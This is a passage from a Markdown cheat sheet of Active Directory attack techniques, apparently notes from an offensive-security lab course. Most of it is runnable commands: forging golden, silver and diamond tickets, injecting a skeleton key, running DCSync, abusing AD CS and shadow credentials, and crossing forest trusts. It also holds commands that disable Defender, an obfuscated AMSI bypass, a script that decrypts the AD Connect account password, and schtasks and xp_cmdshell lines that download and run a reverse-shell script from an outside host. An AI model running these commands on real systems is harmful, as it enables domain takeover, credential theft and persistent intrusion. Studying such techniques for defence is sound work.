> 8. Now we can execute mimikatz on the DC
>
> 9. Keep note of **krbtgt** hash
>
> 10. Now go to any **"non domain admin"** account
>
> 11. Load **Mimikats.ps1** 
>
> 12. Now we can create a ticket using the DC **krbtgt** hash 
>
> 13. Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or 
>
>     ```powershell
>       PsExec64.exe \\prodsrv.garrison.castle.local -u GARRISON\prodadmin -p Password1! cmd
>     ```

---

##### Invoke-Mimikatz

###### Disable Defender [ Important ]

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

###### AMSI bypass [ Important ]

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{O}"-F'F', 'rE' ) ) 3; ( GeT-VariaBle ( "1Q2U" + "zX" )  -VaL_s+)."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{@}{5}" -f'Util', 'A', 'Amsi','.Management.', 'utomation.','s', 'System' ))."g`etf`iE1D"( ( "{O}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{O}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

###### Execute mimikatz on DC as DA to get krbtgt hash

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

###### Create a ticket on any machine [ "pass the ticket" attack]

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:abc.xyz.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

###### List Kerberos services available

```powershell
klist
```

###### To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

```ad-note
Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC
```

---

##### Binaries

###### Using SafetyKatz

```powershell
C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch" "exit" 
or
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

###### On a machine which can reach the DC over network (Need elevation):

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

### Silver Ticket

##### Invoke-Mimikatz

###### Execute mimikatz on DC as DA to get krbtgt hash

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

###### Using hash of the Domain Controller computer account, below command provides access to shares on the DC

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:abc.xyz.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-dc.abc.xyz.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62FF22 /user:Administrator /ptt"'
```

```ad-note
Similar command can be used for any other service on a machine.
Which services? HOST, RPCSS, WSMAN and many more.
```

###### Schedule and execute a task

```powershell
schtasks /create /S dcorp-dc.abc.xyz.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.psi''')'"

schtasks /Run /S dcorp-dc.abc.xyz.local /TN "STCheck"
```

### Skeleton Key

##### Invoke-Mimikatz

###### Use the below command to inject a skeleton-Key

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.abc.xyz.local
```

```ad-note
Skeleton Key password is : **mimikatz**
```

###### Now we can access any machine with valid username and password as mimikatz

```powershell
Enter-PSSession -Computername dcorp-dc.abc.xyz.local -credential dcorp\Administrator
```

###### LSASS running as a protected process

In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC

```mimikatz
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

### Diamond Ticket

##### Rubeus.exe

###### We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too)

```powershell
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /user:studentuserx /password:studentuserxpassword /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

###### We could also use /tgtdeleg option in place of credentials in case we have access as a domain user

```powershell
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### DRSM (Directory Services Restore Mode)

>   There is a local admin on every DC called “Administrator” whose password is the DRSM password. It is possible to pass the NTLM hash of this user to access the DC.

###### Dump DRSM password (needs DA privs)

```powershell
# dump DRSM password hash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername us-dc

# compare admin hash with the hash of below command
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc

# first one is DSRM local admin
```

###### Change logon behaviour of DSRM account

```powershell
Enter-PSSession -Computername us-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

###### Pass the hash

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:917... /run:powershell.exe"'
```

###### To use PSRemoting, we must force NTLM auth

```powershell
Enter-PSSession -Computername us-dc -Authentication Negotiate
```

### AdminSDHolder

###### Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA

```powershell
Add-DomainObjectACL -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

###### Using ActiveDirectory Module and RACE [toolkit](https://github.com/samratashok/RACE)

```powershell
Set-DCPermissions -Method AdminSDHolder -SAMAccountName studentuserl -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,dc=us ,dc=techcorp,dc=local' -Verbose

Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder ,CN=System, dc=us,dc=techcorp,dc=local' -
PrincipalIdentity studentuserl -Rights ResetPassword -
PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -
Verbose

Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder ,CN=System, dc=us,dc=techcorp,dc=local' -
PrincipalIdentity studentuserl -Rights WriteMembers -PrincipalDomain
us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

###### Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory

```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -
Verbose
```

###### Check DA permission

```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -
ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName "studentuser1"}

# Using ActiveDirectory Module:
(Get-Acl -Path 'AD:\CN=Domain Admins , CN=Users , DC=us ,DC=techcorp,DC=local').Access | ?{$_.IdentityReference 'studentuser1'}
```

###### Abusing FullControl using PowerView

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

# Using ActiveDirectory Module:
Add-ADGroupMember -Identity 'Domain Admins' -Members
```

###### Abusing ResetPassword using PowerView

```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

#Using ActiveDirectory Module:
Set-ADAccountPassword -Identity testda -NewPassword
(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

### Rights Abuse

###### Add FullControl rights

```powershell
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuserl -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp. local -Verbose

# Using ActiveDirectory Module and RACE:
Set-ADACL -SamAccountName studentuserl -DistinguishedName 'DC=us,DC=techcorp,DC=local' -Right GenericAll -Verbose
```

###### Add rights for DCSync

```powershell
Add-DomainObjectAcl -TargetIdentity "dc=us ,dc=techcorp,dc=local" -PrincipalIdentity studentuserl -Rights DCSync -PrincipalDomain
us.techcorp.local -TargetDomain us.techcorp. local -Verbose

# Using ActiveDirectory Module and RACE:
Set-ADACL -SamAccountName studentuserl -DistinguishedName 'DC=us,DC=techcorp,DC=local' -GUIDRight DCSync -Verbose
```

###### Execute DCSync

```powershell
Invoke-Mimikatz -Command '"lsadump: :dcsync /user:us\krbtgt"'

# or

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

### Security Descriptors

######  WMI

```powershell
# Load RACE toolkit
C:\AD\Tools\RACE-master\RACE.ps1

# On local machine for student1:
Set-RemotewMI -SamAccountName studentuserl -Verbose

# On remote machine for studentuser1 without explicit credentials:
Set-RemotewMI -SamAccountName studentuserl -ComputerName us-dc -Verbose

# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
Set-RemotewMI -SamAccountName studentuserl -ComputerName us-dc -Credential Administrator -namespace 'root\cimv2' -Verbose

# On remote machine remove permissions:
Set-RemotewMI -SamAccountName studentuserl -ComputerName us-dc -Remove
```

###### PowerShell Remoting

```powershell
# On local machine for studentuser1:
Set-RemotePSRemoting -SamAccountName studentuserl -Verbose

# On remote machine for studentuser1 without credentials:

Set-RemotePSRemoting -SamAccountName studentuserl -ComputerName us-dc -Verbose

# On remote machine, remove the permissions:

Set-RemotePSRemoting -SamAccountName studentuserl -ComputerName us-dc -Remove
```

###### Remote Registry

```powershell
# Using RACE or DAMP toolkit, with admin privs on remote machine
Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuserl -Verbose

# As studentuser1, retrieve machine account hash:
Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose

# Retrieve local account hash:
Get-RemoteLocalAccountHash -ComputerName us-dc -Verbose

# Retrieve domain cached credentials:
Get-RemoteCachedCredential -ComputerName us-dc -Verbose
```

# VIII. Cross Domain Attacks [ Azure AD Integration ]

##### Methodology/Steps

> 1. Enumerate the users accounts who have **MSOL_** attribute identity.
> 2. Start a process with the priv of that user
> 3. Execute adconnect.ps1 script, this will provide the creds of the user
> 4. Connect using runas and perform a DCSync Attack

------

```powershell
# 1. Enumerate the PHS account and server where AD Connect is installed
# Powerview
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local

# AD Module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Server techcorp.local -Properties * | select SamAccountName,Description | fl

# 2. Dump the creds of the user and logon
# Adconnect - With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text
. .\adconnect.ps1
adconnect

# or Runas that user
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd

# 3. Execute the DCSync attack

# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
```

---

###### Abusing Azure AD Connect

+ Run the following script

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

#$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

### AD CS

-   Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
    -   Used by organization for smart cards, SSL certificates, code signing, etc.
-   Clients send certificate signing requests (CSRs) to an (enterprise) CA, which signs issued certificates using the private key for the CA certificate
-   AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
-   "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."

##### Using Rubeus to request for a certificate

-   Rubeus and Kekeo support Kerberos authentication using certificates via PKINIT
    -   Schannel authentication also supports certificates (e.g., LDAPS)

```powershell
# Rubeus
Rubeus.exe asktgt /user:admin /certificate:C:\Temp\cert.pfx /password:password
```

##### **"Passive"** Certificate Theft

-   If hardware protection is not used, existing user/machine certificates are stored using DPAPI
    -   *Mimikatz* and *SharpDPAPI* can steal such certs/private keys

##### **"Active"** Certificate Theft

-   Users/machines can enrol in any template they have Enrol permissions for
    -   By default the User and Machine templates are available
-   We want a template that allows for AD authentication
    -   Lets us get a user’s TGT (and NTLM!)
    -   Lets us compromise a computer through RBCD/S4U2Self
-   We can enroll through DCOM (Certify), RPC, and AD CS web endpoints

```powershell
# Certify
Certify.exe request /ca:da.theshrine.local\theshrine-DC-CA /template:user
```

##### Offensive Advantages

1.  Doesn’t touch `lsass.exe`’s memory!
2.  Doesn’t need elevation (for user contexts)!
3.  Few existing detection methods! (*currently* lesser known technique)
4.  Separate credential material from passwords
    1.  Works even if an account changes its password!
    2.  Long lifetime. By default, User/Machine templates issue certificates valid for 1 year.

### AD CS Abuse

##### Methodology

>   1.  Find vulnerable cert templates.
>   2.  Request a template with the template name and using altname specify the user you want to attack
>   3.  Using openssl generate the pfx from the private key and sign it with a password
>   4.  Using Rubeus request a tgt with the admin pfx and inject it into the session
>   5.  Now we will be able to access the shares of the administrator

##### Binaries

###### 

```powershell
# 1. Search for vulnerable certificate templates
# Certify
# Enumerate the templates
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject

# Enumerate vulnerable templates
Certify.exe find /vulnerable

# Enumerate vulnerable templates using ca
Certify.exe find /vulnerable /ca:dc.theshire.local\theshire-DC-CA

# 2. Enroll in the template
# Certify
Certify.exe request /cs:dc.theshire.local\theshire-DC-CA /template:ESC1Template /altname:Administrator

# 3. Change the RSA into a PFX
# Linux - openssl and provide a password
# Paste the Private key in a file named cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Windows - openssl and provide a password
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem - keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx

# 4. Request a TGT with the pfx
# Request DA TGT and inject it
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt

# Request EA TGT and inject it
Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```

### Shadow Credentials

Users and Computer shave `msDS-KeyCredentialLink` attribute that contains the raw public keys of certificate that can be used as an alternative credential.

##### Pre-requisites to abuse Shadow Credentials

-   AD CS (or Key Trust)
-   Support for PKINIT and at least one DC with Windows Server 2016 or above
-   Permissions (`GenericWrite`/`GenericAll`) to modify the `msDS-KeyCredentialLink` attribute of the target object.

##### Abusing User Object

```powershell
# 1. Enumerate the permissions
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

# 2. Add the Shadow Credential
Whisker.exe add /target:supportXuser

# 3. Using PowerView, see if the Shadow Credential is added.
Get-DomainUser -Identity supportXuser

# 4. Request the TGT by leveraging the certificate
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap

# 5. Inject the TGT in the current session or use the NTLM hash
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

##### Abusing Computer Object

###### 

```powershell
# 1. Enumerate the permissions
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "mgmtadmin"}

# 2. Add the Shadow Credentials
SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:328... /run:cmd.exe" "exit"
Whisker.exe add /target:us-helpdesk$

# 3. Using PowerView, see if the Shadow Credential is added
Get-DomainComputer -Identity us-helpdesk

# 4. Request the TGT by leveraging the certificate
Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0A... /password:"ViGFo..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show

# 5. Request and Inject the TGS by impersonating the user
Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGk... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
```

# IX. Cross Forest Attacks

### Kerberoast

##### Methodology/Steps

>   1.  First find all the SPN accounts
>   2.  Request a TGS for the user who has forest trust
>   3.  Crack the ticket using JTR
>   4.  Using PowerShell request a TGS across trust

```powershell
# 1. Find user accounts used as Service account
# Powerview
Get-NetUser -SPN
Get-NetUser -SPN -Verbose | select displayname,memberof
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}

# AD Module
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName -Server $_.Name}

# 2. Request a TGS
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt

# 3. Check for the TGS
klist

# 4. Crack the ticket
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

# 5. Request TGS across trust
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

### Forest Root Trust Key

##### Methodology/Steps

>   1.  Dump the trust keys of the inter-forest trusts
>   2.  Note the SID of the current Domain, SID of the target Domain and the rc4_hmac_nt(Trust Key) of the target Domain. (example : *ecorp$*)
>   3.  We can forge a inter-forest TGT with the proper *target* and *rc4* parameters
>   4.  Now request a TGS using **asktgs.exe**
>   5.  Now Inject the TGS in the memory
>   6.  Now we can access all the shared files admin DC

------

##### Invoke-Mimikatz

```powershell
# 1. We require the trust key of inter-forest trust
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# 2. Forge the inter-forest TGT
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787- 2521448726-163245708 /sids:S-1-5-21-2781415573- 3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'

# 3. Request a TGS [keko]
# Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket with Kekeo
tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local

# 4. Inject and use the TGS
# Use the TGS to access the targeted service (may need to use it twice)
misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi 
# Or
.\kirbikator.exe lsa .\CIFS.techcorp-dc.techcorp.local.kirbi
ls \\techcorp-dc.techcorp.local\c$
```

##### Rubeus

###### 1. Create ticket and add it into the memory using asktgs

```powershell
# Rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# can access the shares now
ls \\techcorp-dc.techcorp.local\c$
ls \\euvendor-dc.euvendor.local\c$
```

##### PowerShell

###### 1. Access the euvendor-net machine using PSRemoting

```powershell
# cmdlet
Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor\net.euvendor.local -Authentication NegotiateWithImplicitCredential
```

### Extras

##### To use the DCSync feature for getting krbtg hash execute the below command with DC privileges

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:garrison.castle.local /all /cvs"'
```

##### Get the `ForeignSecurityPrincipal`

```powershell
#These SIDs can access to the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

#With the by default SIDs, we find S-1-5-21-493355955-4215530352-779396340-1104
#We search it in our current domain
Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}
```

### PAM Trust

```powershell
# 1. Enumerating trusts and hunting for access [PowerView]
# We have DA access to the techcorp.local forest. By enumerating trusts and hunting for access, we can enumerate that we have Administrative access to the bastion.local forest.
Get-ADTrust -Filter * 
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local

# 2. Enumerate if there is a PAM trust [PowerView]
$bastiondc = New-PSSession bastion-dc.bastion.local 
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined - eq $False)}} -Session $bastiondc


# 3. Check which users are members of the Shadow Principals
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc


# 4. Establish a direct PSRemoting session on bastion-dc and access production.local
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

# X. Trust Abuse

### MSSQL Abuse - Forest Trusts

```powershell
# https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.psd1
Import-Module .\PowerUpSQL.psd1
```

##### Methodology/Steps

>   1.  Check the SPN's and check which SPN's you have access to
>   3.  Check the Privileges you have of the filtered SPN's
>   4.  Keep note of the **Instance-Name**, **ServicePrincipalName** and the **DomainAccount-Name**
>   5.  If you find any service with *higher privileges* continue below to abuse it

------

##### PowerUpSQL [ Basic Enumeration ]

```powershell
# 1. Enumerate SPN
Get-SQLInstanceDomain

# 2. Check Access
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# 3. Check Privileges / Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### MSSQL Abuse - MSSQL Database Links

-   A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
-    In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
-   Database links work even across forest trusts.

##### Execute commands on target server

-   On the target server, either `xp_cmdshell` should be already enabled; or
-   If **rpcout** is enabled (disabled by default), `xp_cmdshell` can be enabled using:

```mssql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

-   If **rpcout** is disabled but we are **sa**, it can be enabled with

```mssql
EXEC sp_serveroption 'LinkedServer', 'rpc out', 'true';
```

#### Methodology/Steps

>   1.  Check the SQL Server link
>   2.  Keep note if you have link to any other database in **DatabaseLinkName**
>   3.  If SysAdmin:0 means that we will not be allowed to enable **xp_cmdshell**
>   4.  Keep on enumerating and check all the linked databases you have access to
>   5.  Now we can try to execute commands through out all the linked databases found

------

##### PowerUpSQL [ Abusing the privileges ]

```powershell
# 1. Enumerate SQL Server links
Get-SQLServerLink -Instance <instanceName> -Verbose
select * from master..sysservers

# 2. Enumerate DB links
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Verbose
select * from openquery("<instanceName>",'select * from openquery("<linkedInstance>",''select * from master..sysservers'')')

# 3. Execute commands on target server
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query "exec master..xp_cmdshell 'whoami'" | ft

# 4. Download file on target server
Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell "powershell -c iex (new-object net.webclient).downloadstring(''http://IP:8080/Invoke-HelloWorld.ps1'',''C:\Windows\Temp\Invoke-HelloWorld.ps1'')"'

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.21/Invoke-PowerShellTcp.ps1'')"'
```

## Extra Commands

##### Basic SQL Server queries for DB enumeration

Also works with **Get-SQLServerLinkCrawl**

```powershell
# View all db in an instance
Get-SQLQuery -Instance <instanceName> -Query "SELECT name FROM sys.databases"

# View all tables
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES" 

# View all cols in all tables in a db
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.columns"

# View data in table
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName"

# Enumerate linked servers
select * from master..sysservers

# Openquery function can be used to run queries on a linked database
select * from openquery("192.168.23.25",'select * from master..sysservers')

# Openquery queries can be chained to access links within links (nested links)
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')

# From the initial SQL server, OS commands can be executed using nested link queries
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')

# How to enable rpcout in a linked DB
# First get a rev shell on the parent DB
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT ""db-sqlsrv"""

# Query command to a linked DB
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName" -QueryTarget db-sqlsrv
```
